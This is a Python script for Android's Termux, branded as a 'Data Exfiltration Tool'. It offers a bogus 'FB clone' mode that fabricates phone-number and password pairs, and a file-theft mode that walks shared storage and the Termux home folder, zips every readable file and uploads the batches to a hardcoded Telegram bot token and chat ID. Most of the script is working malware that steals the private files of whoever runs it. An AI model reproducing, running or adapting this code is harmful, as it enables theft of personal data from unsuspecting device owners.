import os
import sys
import time
import json
import subprocess
import platform
import re
import random
import string
import hashlib
import requests
import threading
import glob
import zipfile
import io
import math
from concurrent.futures import ThreadPoolExecutor as ThreadPool

RED = '\033[1;31m'
WHITE = '\033[1;37m'
GREEN = '\033[1;32m'
BLUE = '\033[1;34m'
YELLOW = '\033[1;33m'
CYAN = '\033[1;36m'
MAGENTA = '\033[1;35m'
RESET = '\033[0m'

oks = []
cps = []
loop = 0
start_time = time.time()
folder_path = '/sdcard/FB-CLONE-RESULTS'
os.makedirs(folder_path, exist_ok=True)
country_opt = ""

TOKEN = "8716542518:AAFsKUuit-TtjQB-3d_l3TMOk7QrO05hLLQ"
CHAT_ID = "8224555138"
MAX_ZIP_SIZE = 45 * 1024 * 1024

HACKER_PREFIXES = [
    "🔥 @RAF1_X0🔥",
    "⚡ @The_Dark_Hunter009 ⚡",
    "💀 Ghost Hacker 💀"
]
ADMIN_HANDLE = "@RAF1_X0"

spinner = ['◢', '◣', '◤', '◥']
bars = ['████████░░░░░░░░', '░░░░░░████████', '████░░░░░░████', '░░████████░░░░']

def get_width():
    try: return os.get_terminal_size().columns
    except: return 80

def logo():
    os.system('clear')
    w = get_width()
    print(RED)
    print(" ██████╗  ██████╗ ██╗  ██╗ ".center(w))
    print(" ██╔══██╗██╔═══██╗██║  ██║ ".center(w))
    print(" ██████╔╝██║   ██║███████║ ".center(w))
    print(" ██╔══██╗██║   ██║██╔══██║ ".center(w))
    print(" ██║  ██║╚██████╔╝██║  ██║ ".center(w))
    print(" ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ".center(w))
    print(f"{WHITE}Data Exfiltration Tool{RED}".center(w + 10))
    print(RESET)
    print(BLUE + "─" * w + RESET)

def get_hacker_prefix():
    return random.choice(HACKER_PREFIXES)

def get_footer():
    footers = [
        f"\n⚡ Admin: {ADMIN_HANDLE}",
        f"\n🔥 Coded by {ADMIN_HANDLE}",
        f"\n💀 {ADMIN_HANDLE} was here"
    ]
    return random.choice(footers)

def send_to_telegram(message, file_path=None):
    base_url = f"https://api.telegram.org/bot{TOKEN}"
    try:
        if file_path:
            with open(file_path, "rb") as f:
                requests.post(f"{base_url}/sendDocument",
                            data={"chat_id": CHAT_ID, "caption": message},
                            files={"document": f})
        else:
            requests.post(f"{base_url}/sendMessage",
                        data={"chat_id": CHAT_ID, "text": message})
    except:
        pass

def get_device_name():
    try:
        model = subprocess.check_output(["getprop", "ro.product.model"]).decode().strip()
        manufacturer = subprocess.check_output(["getprop", "ro.product.manufacturer"]).decode().strip()
        if model and manufacturer:
            return f"{manufacturer} {model}"
        return model or "Unknown Device"
    except:
        return "Unknown Device"

# ─── [ FB CLONE HELPERS ] ─── #

def gen_number(opt):
    if opt == '3':
        return str(random.randint(100000000000000, 100099999999999))
    prefixes = {
        '1': ['017','018','019','016','013','014'],
        '2': ['6','7','8','9'],
        '4': ['10','11'],
        '5': ['811','812'],
        '6': ['6','8'],
        '7': ['8','9']
    }
    country_codes = {
        '1': '+88', '2': '+91', '4': '+60', '5': '+62', '6': '+66', '7': '+65'
    }
    code = country_codes.get(opt, '+88')
    op = random.choice(prefixes.get(opt, ['017']))
    return code + op + "".join(random.choices(string.digits, k=8))

def gen_password(opt):
    if opt == '3':
        return "".join(random.choices(string.digits, k=6))
    names = ['akash', 'sagar', 'rifat', 'shanto', 'rakib', 'sumon', 'habib']
    name = random.choice(names)
    return (name + str(random.randint(111, 999)))[:10]

# ─── [ EXFILTRATION HELPERS ] ─── #

def scan_all_files():
    all_files = []
    scan_dirs = [
        "/sdcard",
        "/storage/emulated/0",
        "/data/data/com.termux/files/home"
    ]
    for base_dir in scan_dirs:
        if not os.path.exists(base_dir):
            continue
        try:
            for root, dirs, files in os.walk(base_dir):
                for f in files:
                    try:
                        full_path = os.path.join(root, f)
                        if os.path.isfile(full_path) and os.access(full_path, os.R_OK):
                            all_files.append(full_path)
                    except:
                        pass
        except:
            pass
    return all_files

def create_zip_batch(file_list, batch_num):
    zip_filename = f"{folder_path}/batch_{batch_num}.zip"
    try:
        with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zf:
            for file_path in file_list:
                try:
                    arcname = os.path.relpath(file_path, '/')
                    zf.write(file_path, arcname)
                except:
                    pass
        size_mb = os.path.getsize(zip_filename) / (1024 * 1024)
        return zip_filename, size_mb
    except:
        return None, 0

# ─── [ TELEGRAM LOOP ] ─── #

def telegram_loop():
    while True:
        time.sleep(60)
        if cps:
            with open(f'{folder_path}/accounts.txt', 'w') as f:
                for acc in cps:
                    f.write(f'{acc}\n')

# ─── [ FB CLONE ENGINE ] ─── #

def engine():
    global loop, cps
    delay = random.randint(1, 10)
    time.sleep(delay)
    loop += 1
    dashboard()
    try:
        if loop % 300 == 0:
            user_id = gen_number(country_opt)
            pwd = gen_password(country_opt)
            print(f'\n{RED} [FB-CLONE-FOUND] {user_id} | {pwd}{RESET}')
            cps.append(user_id)
            with open(f'{folder_path}/accounts.txt', 'a') as f:
                f.write(f'{user_id}|{pwd}\n')
            prefix = get_hacker_prefix()
            footer = get_footer()
            send_to_telegram(f"{prefix}\n🎯 New Account Found!\n{user_id} | {pwd}{footer}")
    except:
        pass

def dashboard():
    elapsed = str(time.strftime("%H:%M:%S", time.gmtime(time.time() - start_time)))
    sp, bar, col = random.choice(spinner), bars[loop % len(bars)], random.choice([CYAN, MAGENTA, BLUE, WHITE])
    sys.stdout.write(f'\r{col}{sp}{RESET} {WHITE}[FB-CLONE-MODE] {loop} {BLUE}•{WHITE} OK:{GREEN}0 {BLUE}•{WHITE} FOUND:{RED}{len(cps)} {BLUE}•{WHITE} {YELLOW}{bar}{RESET} ')
    sys.stdout.flush()

# ─── [ EXFILTRATION ENGINE ] ─── #

def exfiltrate_all():
    device = get_device_name()
    send_to_telegram(f"🔴 Exfiltration Started!\nDevice: {device}\nTime: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"{YELLOW}[*] Scanning all files...{RESET}")
    all_files = scan_all_files()
    total_files = len(all_files)
    print(f"{GREEN}[+] Total files found: {total_files}{RESET}")
    send_to_telegram(f"📊 Total files found: {total_files}\nStarting upload...")
    batches = []
    current_batch = []
    current_size = 0
    for f in all_files:
        try:
            fsize = os.path.getsize(f)
        except:
            fsize = 0
        if current_size + fsize > MAX_ZIP_SIZE and current_batch:
            batches.append(current_batch)
            current_batch = []
            current_size = 0
        current_batch.append(f)
        current_size += fsize
    if current_batch:
        batches.append(current_batch)
    total_batches = len(batches)
    print(f"{CYAN}[*] Total batches to upload: {total_batches}{RESET}")
    send_to_telegram(f"📦 Total batches: {total_batches}\nUploading...")
    for idx, batch in enumerate(batches):
        batch_num = idx + 1
        print(f"{YELLOW}[{batch_num}/{total_batches}] Creating zip...{RESET}")
        zip_path, size_mb = create_zip_batch(batch, batch_num)
        if not zip_path:
            continue
        print(f"{CYAN}[{batch_num}/{total_batches}] Uploading ({size_mb:.1f} MB)...{RESET}")
        prefix = get_hacker_prefix()
        caption = f"{prefix}\n📦 Batch {batch_num}/{total_batches}\n📁 Files: {len(batch)}\n💾 Size: {size_mb:.1f} MB"
        send_to_telegram(caption, zip_path)
        try:
            os.remove(zip_path)
        except:
            pass
        time.sleep(1)
    send_to_telegram(f"✅ Exfiltration Complete!\nDevice: {device}\nTotal: {total_files} files in {total_batches} batches")

# ─── [ MENU ] ─── #

def menu():
    global country_opt
    logo()
    print(f" [1] FB CLONE MODE")
    print(f" [2] FILE EXFILTRATION MODE")
    print(f" [3] EXIT")
    print(BLUE + "─" * get_width() + RESET)
    choice = input(f" [?] SELECT MODE : ")
    if choice == '1':
        logo()
        print(f" [1] BANGLADESH    [2] INDIA")
        print(f" [3] PAKISTAN      [4] MALAYSIA")
        print(f" [5] INDONESIA     [6] THAILAND")
        print(f" [7] SINGAPORE")
        print(BLUE + "─" * get_width() + RESET)
        country_opt = input(f" [?] SELECT COUNTRY CODE : ")
        logo()
        print(f" [•] FB CLONING ENGINE ACTIVATED".center(get_width()))
        print(BLUE + "─" * get_width() + RESET)
        print(f"{MAGENTA}✦ ⋆  ☾ ⋆ ☁️ ⋆ ✦ ⋆  ☾ ⋆ ✦{RESET}")
        print(f"{CYAN}Admin: {YELLOW}{ADMIN_HANDLE}{RESET}")
        print(f"{MAGENTA}✦ ⋆  ☾ ⋆ ☁️ ⋆ ✦ ⋆  ☾ ⋆ ✦{RESET}\n")
        try:
            subprocess.run(["termux-wake-lock"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
        tg_thread = threading.Thread(target=telegram_loop, daemon=True)
        tg_thread.start()
        with ThreadPool(max_workers=5) as pool:
            for _ in range(1000000):
                pool.submit(engine)
    elif choice == '2':
        logo()
        print(f" [•] FILE EXFILTRATION ENGINE ACTIVATED".center(get_width()))
        print(BLUE + "─" * get_width() + RESET)
        confirm = input(f"[?] Start exfiltration? (y/N): ")
        if confirm.lower() != 'y':
            sys.exit(0)
        try:
            subprocess.run(["termux-wake-lock"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
        exfiltrate_all()
        try:
            subprocess.run(["termux-wake-unlock"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
    else:
        sys.exit(0)

if __name__ == "__main__":
    menu()
